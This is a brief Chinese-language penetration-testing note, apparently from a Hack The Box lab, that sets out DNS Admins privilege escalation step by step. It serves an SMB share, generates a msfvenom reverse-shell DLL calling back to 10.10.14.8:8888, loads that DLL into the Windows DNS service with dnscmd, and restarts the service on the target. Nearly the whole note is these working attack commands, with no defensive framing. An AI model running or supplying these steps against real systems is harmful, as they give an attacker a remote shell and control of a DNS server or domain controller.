# dns admin

就是通过恶意dll挟持dns

```clike
1. 开启一个共享
smbserver.py s .
2. 生成payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=8888 -f dll -o rev.dll
3. 加载payload
dnscmd.exe /config /serverlevelplugindll \\10.10.14.8\s\rev.dll
4. 重启dns服务
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```
